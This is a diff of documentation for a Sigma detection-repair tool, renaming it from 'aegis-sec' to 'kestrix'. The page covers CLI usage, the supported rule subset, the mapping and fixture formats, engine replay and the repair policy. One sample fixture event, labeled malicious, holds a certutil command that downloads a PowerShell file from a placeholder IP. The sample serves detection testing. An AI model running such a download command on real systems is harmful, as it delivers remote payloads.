@@ -2,7 +2,7 @@
 
 Detection repair finds out why a Sigma rule misses attacks or fires on benign activity, proposes the smallest fix it can justify, and checks that fix by replaying labeled events on a pinned Elasticsearch. Use it when a rule that used to work has gone quiet after a log pipeline change, when a rule is noisy, or when you want to know whether the telemetry a rule needs is collected at all. You give it three things: a Sigma rule, an environment field mapping and labeled JSONL events. It answers with one outcome (`repaired`, `unchanged`, `abstained`, `insufficient_evidence`, `unsupported` or `engine_unavailable`) and a JSON report that holds the evidence.
 
-The rest of this page is reference material. Source files are under [`src/aegissec/detect/`](../../src/aegissec/detect/).
+The rest of this page is reference material. Source files are under [`src/kestrix/detect/`](../../src/kestrix/detect/).
 
 ## Contents
 
@@ -26,22 +26,22 @@ The rest of this page is reference material. Source files are under [`src/aegiss
 Detection repair needs Docker for the replay engine. Every other module works without it.
 
 ```bash
-aegis-sec detect engine-up        # starts the pinned Elasticsearch on 127.0.0.1:9200
-aegis-sec detect engine-status    # prints "ready: http://127.0.0.1:9200" once it is up
-aegis-sec detect cases            # lists the 11 bundled demonstrations
-aegis-sec detect demo c01-mapping-drift-commandline
+kestrix detect engine-up        # starts the pinned Elasticsearch on 127.0.0.1:9200
+kestrix detect engine-status    # prints "ready: http://127.0.0.1:9200" once it is up
+kestrix detect cases            # lists the 11 bundled demonstrations
+kestrix detect demo c01-mapping-drift-commandline
 ```
 
 To run your own rule:
 
 ```bash
-aegis-sec detect run --rule rule.yml --mapping mapping.yml \
+kestrix detect run --rule rule.yml --mapping mapping.yml \
   --dev development.jsonl --validation validation.jsonl
 ```
 
 Without `--validation`, a repair is reported as provisional (see [Workflow](#workflow-and-acceptance-policy)).
 
-The dashboard (`aegis-sec dashboard`) runs the same workflow from the Detection repair page, on a bundled case or on your own files.
+The dashboard (`kestrix dashboard`) runs the same workflow from the Detection repair page, on a bundled case or on your own files.
 
 ![Detection repair page of the dashboard in dark mode](../screenshots/detect-1280-dark.png)
 
@@ -53,15 +53,15 @@ The dashboard (`aegis-sec dashboard`) runs the same workflow from the Detection 
 | `detect demo CASE_ID` | `--json`, `--evidence-dir PATH` | Runs a bundled case end to end. |
 | `detect run` | `--rule`, `--mapping`, `--dev` (required); `--validation`, `--healthy-rule`, `--healthy-mapping`, `--json`, `--evidence-dir PATH` | Runs the workflow on your files. |
 | `detect engine-status` | none | Checks that the engine is reachable and runs the pinned version. Exit 0 when ready, 3 otherwise. |
-| `detect engine-up` | `--name` (default `aegis-es`) | Starts the pinned image with `docker run`, bound to `127.0.0.1:9200`, single node, security disabled, 1 GB heap. Exit 3 if Docker is missing or `docker run` fails. |
+| `detect engine-up` | `--name` (default `kestrix-es`) | Starts the pinned image with `docker run`, bound to `127.0.0.1:9200`, single node, security disabled, 1 GB heap. Exit 3 if Docker is missing or `docker run` fails. |
 
 - `--json` prints the full report instead of the text summary.
 - `--evidence-dir` also writes the report as a content-addressed file (see [Evidence](#evidence-files)).
-- The engine URL comes from `AEGIS_ES_URL` and defaults to `http://127.0.0.1:9200` ([`api.py`](../../src/aegissec/detect/api.py)).
+- The engine URL comes from `KESTRIX_ES_URL` and defaults to `http://127.0.0.1:9200` ([`api.py`](../../src/kestrix/detect/api.py)).
 
 ## Supported Sigma subset
 
-Version one accepts one kind of rule: a single-event Windows `process_creation` rule built from named selections. [ADR 0002](../adr/0002-sigma-subset-common-idioms.md) widened the subset to the four idioms most common in SigmaHQ: lists of field maps, `|all`, `1 of` and `all of`. Each one has a test on the pinned engine. Anything outside that subset is rejected with a reason code before conversion. The parser does not guess at semantics it cannot replay. The rules live in [`rule.py`](../../src/aegissec/detect/rule.py) and [`core/safe_load.py`](../../src/aegissec/core/safe_load.py).
+Version one accepts one kind of rule: a single-event Windows `process_creation` rule built from named selections. [ADR 0002](../adr/0002-sigma-subset-common-idioms.md) widened the subset to the four idioms most common in SigmaHQ: lists of field maps, `|all`, `1 of` and `all of`. Each one has a test on the pinned engine. Anything outside that subset is rejected with a reason code before conversion. The parser does not guess at semantics it cannot replay. The rules live in [`rule.py`](../../src/kestrix/detect/rule.py) and [`core/safe_load.py`](../../src/kestrix/core/safe_load.py).
 
 ### Supported
 
@@ -104,11 +104,11 @@ Matching is case-insensitive because of the [index settings](#engine-and-index-s
 | Rule over 100 KiB | `input_too_large` |
 | pySigma conversion fails or returns more than one query | `conversion_failed` |
 
-Codes that start with `unsupported_`, plus `unknown_field`, produce the `unsupported` outcome (exit 11). The others are input errors: the CLI exits 2 and the API returns HTTP 400 ([`workflow.py`](../../src/aegissec/detect/workflow.py), `UNSUPPORTED_REASONS`).
+Codes that start with `unsupported_`, plus `unknown_field`, produce the `unsupported` outcome (exit 11). The others are input errors: the CLI exits 2 and the API returns HTTP 400 ([`workflow.py`](../../src/kestrix/detect/workflow.py), `UNSUPPORTED_REASONS`).
 
 ## Environment mapping file
 
-The mapping says which index field holds each Sigma field in your environment. It plays the role of a pySigma processing pipeline ([`mapping.py`](../../src/aegissec/detect/mapping.py)).
+The mapping says which index field holds each Sigma field in your environment. It plays the role of a pySigma processing pipeline ([`mapping.py`](../../src/kestrix/detect/mapping.py)).
 
 ```yaml
 schema_version: 1
@@ -130,7 +130,7 @@ Conversion uses the pySigma Lucene backend with one field-mapping transformation
 
 ## Labeled fixture file
 
-Fixtures are JSON Lines: one event object per line ([`fixtures.py`](../../src/aegissec/detect/fixtures.py)).
+Fixtures are JSON Lines: one event object per line ([`fixtures.py`](../../src/kestrix/detect/fixtures.py)).
 
 ```json
 {"event_id": "d-m1", "label": "malicious", "scenario_id": "S-certutil-urlcache", "data": {"process": {"executable": "C:\\Windows\\System32\\certutil.exe", "command_line": "certutil.exe -urlcache -f http://198.51.100.9/p.ps1 out.bin"}}}
@@ -157,7 +157,7 @@ Any rule violation raises `invalid_fixture` (or `malformed_jsonl`, `input_too_la
 
 ## Engine and index semantics
 
-The engine is the only matching oracle. Aegis-Sec has no Python matcher standing in for it, and a successful conversion is never treated as proof that a rule works ([`engine.py`](../../src/aegissec/detect/engine.py)).
+The engine is the only matching oracle. Kestrix has no Python matcher standing in for it, and a successful conversion is never treated as proof that a rule works ([`engine.py`](../../src/kestrix/detect/engine.py)).
 
 **Pinned version.** The image is `docker.elastic.co/elasticsearch/elasticsearch:8.19.3` locked to digest `sha256:bbac63ecd50e9263565fbb616172a5287d5f99e486d76453e81e32cafcba3838`. Every run first checks that the engine reports version 8.19.3. Any other version fails with `engine_error`.
 
@@ -182,7 +182,7 @@ The engine is the only matching oracle. Aegis-Sec has no Python matcher standing
 
 ## Diagnosis
 
-Diagnosis compares the rule's fields with what the development events contain, then compares replay matches with labels ([`diagnose.py`](../../src/aegissec/detect/diagnose.py)). It can return several hypotheses at once. Ambiguous evidence returns every plausible family instead of one guess.
+Diagnosis compares the rule's fields with what the development events contain, then compares replay matches with labels ([`diagnose.py`](../../src/kestrix/detect/diagnose.py)). It can return several hypotheses at once. Ambiguous evidence returns every plausible family instead of one guess.
 
 **Coverage.** For each field the rule uses, the report lists `sigma_field`, `index_field`, `mapped` (true when the mapping names it explicitly), `present` (development events with a non-null value at that index field) and `total`.
 
@@ -209,7 +209,7 @@ A similar name alone does not qualify a field. Qualifying fields are ranked by t
 
 ## Repair contract
 
-A repair candidate is a structured envelope validated with Pydantic. Unknown keys are refused ([`candidate.py`](../../src/aegissec/detect/candidate.py)).
+A repair candidate is a structured envelope validated with Pydantic. Unknown keys are refused ([`candidate.py`](../../src/kestrix/detect/candidate.py)).
 
 | Field | Rule |
 | --- | --- |
@@ -246,7 +246,7 @@ A predicate spec has `field`, `modifier` (`equals`, `contains`, `startswith` or 
 
 A patched rule is re-serialized and parsed again, so it must pass the same validator as an imported rule. At most four candidates survive screening.
 
-**B0 generators.** Baseline B0 proposes candidates from the evidence without any model ([`repair.py`](../../src/aegissec/detect/repair.py)):
+**B0 generators.** Baseline B0 proposes candidates from the evidence without any model ([`repair.py`](../../src/kestrix/detect/repair.py)):
 
 - **Mapping.** One `mapping` candidate per alternative field.
 - **Noise.** One `add_exclusion` per context field, tried in this order: `ParentImage`, `OriginalFileName`, `Company`, `Product`, `ParentCommandLine`, `User`, `Image`. A field qualifies when the benign matches carry 1 to 8 distinct values in it, and none of those values (ignoring case) appears on any malicious event. Candidates are ranked by how many benign matches they cover, and the top four are kept. `CommandLine` is never used, because exact command-line exclusions overfit the fixtures.
@@ -254,7 +254,7 @@ A patched rule is re-serialized and parsed again, so it must pass the same valid
 
 ## Workflow and acceptance policy
 
-The workflow is one function shared by the CLI and the API ([`workflow.py`](../../src/aegissec/detect/workflow.py)).
+The workflow is one function shared by the CLI and the API ([`workflow.py`](../../src/kestrix/detect/workflow.py)).
 
 1. **Parse** the rule. An unsupported construct ends the run as `unsupported`.
 2. **Load** the mapping and fixtures, and profile the development schema.
@@ -277,7 +277,7 @@ The workflow is one function shared by the CLI and the API ([`workflow.py`](../.
 
 If you give no validation fixtures, step 8 ends the run as `repaired` with `"provisional": true` and the reason "development evidence only; supply validation fixtures before approval".
 
-**Policy failures** (`policy_failures` in [`workflow.py`](../../src/aegissec/detect/workflow.py)):
+**Policy failures** (`policy_failures` in [`workflow.py`](../../src/kestrix/detect/workflow.py)):
 
 | Code | Meaning |
 | --- | --- |
@@ -302,7 +302,7 @@ A passed suite establishes behavior only on the scenarios it tested. Zero benign
 | `unsupported` | The rule uses semantics outside the supported subset. | 11 |
 | `engine_unavailable` | The engine was not reachable at the start of the run. Static coverage is still reported. | 3 |
 
-Exit code 2 means the run could not produce an outcome. Causes include a rejected rule, mapping or fixture, an unknown case ID or missing file, an engine that is not the pinned version, an engine error while loading events, and an engine that became unreachable after the run started. The error is printed to stderr as `error: <reason>: <detail>` ([`cli.py`](../../src/aegissec/detect/cli.py)).
+Exit code 2 means the run could not produce an outcome. Causes include a rejected rule, mapping or fixture, an unknown case ID or missing file, an engine that is not the pinned version, an engine error while loading events, and an engine that became unreachable after the run started. The error is printed to stderr as `error: <reason>: <detail>` ([`cli.py`](../../src/kestrix/detect/cli.py)).
 
 ## Report and evidence JSON
 
@@ -326,17 +326,17 @@ The report is the same for `detect run --json`, `detect demo --json`, `POST /api
 | `selected`, `provisional` | `repaired` only: the chosen `proposal_id`, and whether validation was skipped |
 | `diff` | `repaired` only: unified diff of `rule.yml` or `mapping.yml` |
 | `artifact` | `repaired` only: `kind` (`rule` or `mapping`), `content` (the full patched file) and `sha256` |
-| `manifest` | `aegis_sec_version`, `git_sha`, `python`, `platform`, `machine`, `started_at`, `finished_at`, `elapsed_ms`, `engine_image`, `pysigma`, `pysigma_backend_elasticsearch` |
+| `manifest` | `kestrix_version`, `git_sha`, `python`, `platform`, `machine`, `started_at`, `finished_at`, `elapsed_ms`, `engine_image`, `pysigma`, `pysigma_backend_elasticsearch` |
 
 Each replay result holds `rule_sha256`, `mapping_sha256`, `dataset_sha256`, `query`, `error`, `counts` (`tp`, `fp`, `fn`, `tn`, `unknown_matched`, or `null` on error), `scenarios_expected`, `scenarios_detected` and `matched_event_ids`. Events labeled `unknown` count only toward `unknown_matched`.
 
 ### Evidence files
 
-With `--evidence-dir DIR`, the report is serialized as canonical JSON (sorted keys, no spaces, UTF-8), hashed with SHA-256 and written atomically to `DIR/<sha256>.json` ([`core/evidence.py`](../../src/aegissec/core/evidence.py)). The printed output gains an `evidence` key with `sha256` and `path`; the stored file does not contain that key. The manifest holds timestamps, so two runs of the same case produce different files.
+With `--evidence-dir DIR`, the report is serialized as canonical JSON (sorted keys, no spaces, UTF-8), hashed with SHA-256 and written atomically to `DIR/<sha256>.json` ([`core/evidence.py`](../../src/kestrix/core/evidence.py)). The printed output gains an `evidence` key with `sha256` and `path`; the stored file does not contain that key. The manifest holds timestamps, so two runs of the same case produce different files.
 
 ## Bundled cases
 
-The 11 cases under [`src/aegissec/detect/cases/`](../../src/aegissec/detect/cases/) are generated by [`scripts/build_detect_cases.py`](../../scripts/build_detect_cases.py). Every event is synthetic (`provenance: synthetic`). They are unit-level demonstrations of each path through the workflow, not a benchmark, and they say nothing about real telemetry. The engine test suite checks that each case reaches its expected outcome.
+The 11 cases under [`src/kestrix/detect/cases/`](../../src/kestrix/detect/cases/) are generated by [`scripts/build_detect_cases.py`](../../scripts/build_detect_cases.py). Every event is synthetic (`provenance: synthetic`). They are unit-level demonstrations of each path through the workflow, not a benchmark, and they say nothing about real telemetry. The engine test suite checks that each case reaches its expected outcome.
 
 Each case directory holds `case.yml`, `rule.yml`, `mapping.yml`, `development.jsonl` and `validation.jsonl`, plus `healthy_rule.yml` or `healthy_mapping.yml` where a healthy reference applies.
 
@@ -373,7 +373,7 @@ detection:
 The environment mapping still points `CommandLine` at `winlog.event_data.CommandLine`, but the events now store it in `process.command_line`. The run below used the pinned engine at `http://127.0.0.1:9200`:
 
 ```text
-$ uv run aegis-sec detect demo c01-mapping-drift-commandline
+$ uv run kestrix detect demo c01-mapping-drift-commandline
 outcome: repaired
 rule:    Certutil remote download  (e1f7a2c859ae)
 finding: mapping [mapped_field_absent, similar_field_observed] CommandLine
